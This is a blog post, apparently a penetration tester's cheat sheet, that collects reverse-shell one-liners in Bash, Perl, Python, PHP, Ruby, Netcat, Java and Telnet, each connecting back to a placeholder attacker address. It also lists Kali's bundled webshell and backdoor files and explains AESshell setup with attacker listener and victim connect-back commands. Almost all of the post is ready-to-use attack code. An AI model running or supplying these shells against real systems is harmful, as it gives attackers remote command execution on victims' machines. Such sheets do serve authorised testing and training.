---
layout: post
title:  "Reverse Shell 1337 Sh33t"
date:   2018-11-09 09:00:00 +1100
categories: [reverse-shell]
permalink: /:title:output_ext
comments: true
---
<br>
**Sources:**
[Pentest Monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and 
[Highon.Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

------
**Bash**

    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

------
**Perl**

    perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    OR
    perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
    
------
**Python**

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

------
**PHP**

    php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
    (Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
    
------
**Ruby**

    ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
    
------
**Netcat**

    nc -e /bin/sh 10.0.0.1 1234
    OR
    /bin/sh | nc ATTACKING-IP 80
    OR
    rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
    
-- If we have the wrong version of netcat installed, we can use the following:

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
    
------
**Java**

    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()

------
**Telnet**

    rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
    OR
    telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
    
------
### Webshells on Kali

    root@kali:~/Desktop# ls -l /usr/share/webshells/*

------
**ASP Shell**

    /usr/share/webshells/asp:
    total 8
    -rw-r--r-- 1 root root 1200 Aug 18  2015 cmd-asp-5.1.asp
    -rw-r--r-- 1 root root 1526 Aug 18  2015 cmdasp.asp

------
**ASPX Shell**

    /usr/share/webshells/aspx:
    total 4
    -rw-r--r-- 1 root root 1400 Aug 18  2015 cmdasp.aspx

------
**Cold Fusion Shell**

    /usr/share/webshells/cfm:
    total 4
    -rw-r--r-- 1 root root 1285 Aug 18  2015 cfexec.cfm

------
**JSP Shell**

    /usr/share/webshells/jsp:
    total 8
    -rw-r--r-- 1 root root  725 Aug 18  2015 cmdjsp.jsp
    -rw-r--r-- 1 root root 2451 Aug 18  2015 jsp-reverse.jsp

------
**Perl Shell**

    /usr/share/webshells/perl:
    total 8
    -rw-r--r-- 1 root root  585 Aug 18  2015 perlcmd.cgi
    -rwxr-xr-x 1 root root 3712 Aug 18  2015 perl-reverse-shell.pl

------
**PHP Shell**
   
    /usr/share/webshells/php:
    total 44
    -rw-r--r-- 1 root root  4515 Aug 18  2015 findsock.c
    -rw-r--r-- 1 root root  2800 Aug 18  2015 php-backdoor.php
    -rwxr-xr-x 1 root root  3467 Aug 18  2015 php-findsock-shell.php
    -rwxr-xr-x 1 root root  5491 Aug 18  2015 php-reverse-shell.php
    -rw-r--r-- 1 root root 13585 Aug 18  2015 qsd-php-backdoor.php
    -rw-r--r-- 1 root root   328 Aug 18  2015 simple-backdoor.php
    root@kali:~/Desktop#

-- Use **simple-backdoor.php** to quickly check for RCE and **php-reverse-shell.php** for a reverse shell and if python is running on the target machine, then run <br><code>python -c 'import pty; pty.spawn("/bin/bash")'</code> to get interactive tty shell.

------
\-- Another option is python pty shell found [here](https://github.com/infodox/python-pty-shells). Upload **tcp_pty_backconnect.py** and run **tcp_pty_shell_handler.py** on Kali to receive the shell.

------
\-- [AESshell](https://github.com/curesec/tools/tree/master/aesshell) written in Python for Windows and Linux

Create a new package:
```$ ./prepare.py```

Build Exe:

```C:\pyinstaller -F bc.spec```

Test it:
```C:\dist\bc.exe```

Attacker expecting a MS remote shell:
```$ python listen.py -lip 0.0.0.0 -lport 1443 -os win```

Attacker expecting a unix remote shell:
```$ python listen.py -lip 0.0.0.0 -lport 1443 -os lnx```

**Usage bc.py / bc.exe**

    $ python2 bc.py -h
    usage: AESshell backconnect (bc.py) [-h] -rip RIP -rport RPORT</code>

    optional arguments:
    -h, --help    show this help message and exit
    -rip RIP      Remote IP you want to connect to
    -rport RPORT  Remote Port you want to connect to

Victim MS-Windows:
<code>C:\bc.exe -rip 192.168.1.1 -rport 1443</code>

Victim \*nix with python interpreter:
<code>$ python bc.py -rip 192.168.1.1 -rport 1443</code>
